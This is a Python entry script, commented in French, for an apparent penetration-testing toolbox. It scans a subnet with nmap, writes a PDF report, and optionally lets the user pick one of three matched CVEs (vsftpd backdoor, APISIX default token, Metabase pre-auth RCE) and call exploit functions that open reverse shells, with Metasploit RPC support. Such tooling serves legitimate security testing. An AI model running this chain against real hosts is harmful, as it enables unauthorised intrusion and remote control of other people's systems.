import argparse
from rich.console import Console
from rich.table import Table
from rich import print
from modules.scan import nmap_ping_scan, nmap_service_scan
from modules.pdf import generate_pdf_report
from modules.exploit import exploit_vsftpd_backdoor, exploit_apisix_default_token_rce, exploit_metabase_preauth_rce
from modules.msfrpcd import is_msfrpcd_running
import inquirer

def main():
    usage = "python main.py -s [SUBNET] -h [HELP]"
    description = "TOOLBOX V1 🧰"
    
    # Arguments du script
    options = argparse.ArgumentParser(usage=usage, description=description, add_help=False)
    options.add_argument('-s', '--subnet', help='Sous-réseau à scanner pour les hôtes actifs', required=True)
    options.add_argument('-l', '--lhost', help='Adresse local pour le reverse shell', default='192.168.1.1')
    options.add_argument('-p', '--lport', help='Port local pour le reverse shell', default='4444')
    options.add_argument('-P', '--msf_port', help='Port Metasploit RPC', type=int, default=55553)
    options.add_argument('-mp', '--msf_pass', help='Pass for Metasploit RPC', default="msf")
    options.add_argument('-e', '--exploit', action='store_true', help='Exploiter les CVEs')
    options.add_argument('-o', '--output', help='Spécifier le nom du rapport PDF', default='rapport_toolbox.pdf')
    options.add_argument('-h', '--help', action='help', help='Affiche les options disponibles')
    args = options.parse_args()
    
    # Initialisation de la console Rich
    console = Console()
    
    # ASCII art :)
    toolbox_art = """[yellow]
████████╗░█████╗░░█████╗░██╗░░░░░██████╗░░█████╗░██╗░░██╗  ██╗░░░██╗░░███╗░░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗╚██╗██╔╝  ██║░░░██║░████║░░
░░░██║░░░██║░░██║██║░░██║██║░░░░░██████╦╝██║░░██║░╚███╔╝░  ╚██╗░██╔╝██╔██║░░
░░░██║░░░██║░░██║██║░░██║██║░░░░░██╔══██╗██║░░██║░██╔██╗░  ░╚████╔╝░╚═╝██║░░
░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╦╝╚█████╔╝██╔╝╚██╗  ░░╚██╔╝░░███████╗
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░░╚════╝░╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝
[/yellow]
"""
    
    print(toolbox_art)
    
    # Vérification si msfrpcd fonctionne
    is_msfrpcd_running()

    # Découverte des hôtes 
    live_hosts = nmap_ping_scan(args.subnet)

    if len(live_hosts) == 1:
        print(f"[bold green][+][/bold green] [bright_green]1[/bright_green] machine a été trouvée dans le sous-réseau [bold bright_green]{args.subnet}[/bold bright_green] 🌐")
    elif len(live_hosts) > 1:
        print(f"[bold green][+][/bold green] [bright_green]{len(live_hosts)}[/bright_green] machines ont été trouvées dans le sous-réseau [bold bright_green]{args.subnet}[/bold bright_green] 🌐")
    else:
        print(f"[bold red][!][/bold red] Aucun hôte n'a été trouvé dans le sous-réseau [bold red]{args.subnet}[/bold red] 🌐")

    # Création d'un tableau pour afficher la liste des hôtes
    print("")
    table = Table(title="Liste des hôtes 🖥️", show_header=True, header_style="bold magenta")
    table.add_column("[cyan]Hôte[/cyan]")

    if len(live_hosts) > 0:
        for host_info in live_hosts:
            table.add_row(host_info['host'])
        console.print(table)

    details_hosts = nmap_service_scan(live_hosts)

    # Pour débug les outputs de nmap
    # for host_info in details_hosts:
    #     host = host_info['host']
    #     scan_output = host_info.get('scan_output', '')
    #     print(f"[bold green][+][/bold green] Sortie du scan Nmap pour l'hôte [bold cyan]{host}[/bold cyan]:\n{scan_output}")
    
    # Générer le rapport PDF
    generate_pdf_report(args.subnet, live_hosts, pdf_filename=args.output)

    # Exploiter les CVEs détectées si il y a l'argument -e ou --exploit 
    if args.exploit:
        cve_count = 0
        selected_cve = None
        cve_list = []
        for host_info in details_hosts:
            host = host_info['host']
            services = host_info.get('services', {})
            for port, service in services.items():
                cve_count += 1
                if service['name'] == 'ftp' and service['product'] == 'vsftpd' and service['version'] == '2.3.4':
                    cve_list.append(f"{host} est vulnérable à la CVE-2011-2523")

                elif service['product'] == 'OpenResty web app server' and 'APISIX/2.11.0' in service.get('http_server_header', ''): 
                    cve_list.append(f"{host} est vulnérable à la CVE-2020-13945")

                elif service['name'] == 'http' and 'Jetty(11.0.14)' in service.get('http_server_header', ''):
                    cve_list.append(f"{host} est vulnérable à la CVE-2023-38646")
        
        if cve_count == 0:
            print(f"[bold red][!][/bold red] Aucun hôte vulnérable n'a été trouvé dans le sous-réseau [bold red]{args.subnet}[/bold red] 🌐")

        if cve_count > 0:
            cve_question = inquirer.List('cve', message="Sélectionnez la CVE à exploiter", choices=cve_list)
            selected_cve = inquirer.prompt([cve_question])['cve']

            for host_info in details_hosts:
                host = host_info['host']
                services = host_info.get('services', {})
                for port, service in services.items():

                    if service['name'] == 'ftp' and service['product'] == 'vsftpd' and service['version'] == '2.3.4':
                        if f"{host} est vulnérable à la CVE-2011-2523" in selected_cve:
                            print(f"[bold green][+][/bold green] Ouverture d'un shell semi-interactif sur [yellow]{host}[/yellow] en exploitant la [yellow]CVE-2011-2523[/yellow] </>")
                            exploit_vsftpd_backdoor(host, args.msf_pass)

                    elif service['product'] == 'OpenResty web app server' and 'APISIX/2.11.0' in service.get('http_server_header', ''): 
                        if f"{host} est vulnérable à la CVE-2020-13945" in selected_cve:
                            print(f"[bold green][+][/bold green] Ouverture d'un shell interactif sur [yellow]{host}[/yellow] pour la [yellow]CVE-2020-13945[/yellow] </>")
                            exploit_apisix_default_token_rce(host, args.lhost, args.lport)

                    elif service['name'] == 'http' and 'Jetty(11.0.14)' in service.get('http_server_header', ''):
                        if f"{host} est vulnérable à la CVE-2023-38646" in selected_cve:
                            print(f"[bold green][+][/bold green] Ouverture d'un shell interactif sur [yellow]{host}[/yellow] en exploitant la [yellow]CVE-2023-38646[/yellow] </>")
                            exploit_metabase_preauth_rce(host, args.lhost, args.lport)
    
# Execution de notre fonction main
if __name__ == '__main__':
    main()

